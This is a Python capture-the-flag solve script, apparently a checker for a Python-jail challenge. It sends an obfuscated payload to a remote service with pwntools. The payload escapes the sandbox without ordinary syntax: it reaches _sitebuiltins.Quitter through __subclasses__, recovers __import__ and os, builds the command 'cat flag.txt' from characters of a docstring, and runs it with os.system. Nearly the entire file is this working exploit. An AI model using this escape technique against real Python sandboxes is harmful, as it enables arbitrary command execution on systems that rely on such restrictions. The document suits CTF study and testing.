#!/usr/bin/env python3
from pwn import remote, log, logging
from argparse import ArgumentParser
from pathlib import Path


logging.disable()

exploit = """
for __name__ in __builtins__.__class__.__doc__: break

for f in lambda _: _,: break
for none in f.__doc__,: break

class C:
    for __init__ in lambda s, _: none,: break
    for __iter__ in lambda s: s,: break

@C
class c: pass

for C.__next__ in __builtins__.__class__.__base__.__subclasses__,: break
for subclasses in c: break

for _,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,sitebuiltins_Quitter,_,_,_,_ in subclasses,: break
del subclasses

for globals in sitebuiltins_Quitter.__init__.__globals__, : break

for C.__getattr__ in globals.__getitem__, : break
for builtins in c.__builtins__, : break
del globals

for C.__getattr__ in builtins.__getitem__, : break
for __import__ in c.__import__, : break
for str in c.str, : break
del builtins

for _,_t,_,_,_,_,_,_,_c,_,_,_,_,_,_space,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_f,_,_,_,_,_,_,_,_,_,_,_,_,_,_g,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_a,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_dot,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_x,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_l,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_ in str.__doc__, : break

for C.__next__ in str, : break
for cat_flag in c: break

for ch in _c,_a,_t,_space,_f,_l,_a,_g,_dot,_t,_x,_t:
    for ret_ch in lambda _: ch,: break

    @cat_flag.__add__
    @ret_ch
    class cat_flag: pass

for C.__getattr__ in __import__, : break
for os in c.os, : break

@os.system
@cat_flag.format
class _: pass
""".replace('\n', '\r')

def main(hostname, port):
    io = remote(hostname, port)
    io.sendline(exploit.encode())
    flag = io.recvline()
    io.close()
    if b"ifctf" in flag:
        log.success(f"{flag = :}")
        print("OK - Flag found")
        exit(0)
    else:
        print("ERROR - could not retrieve the flag")
        exit(1)


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    args = parser.parse_args()

    hostname = args.hostname or 'localhost'
    port = int(args.port) if args.port is not None else 10001

    main(hostname, port)
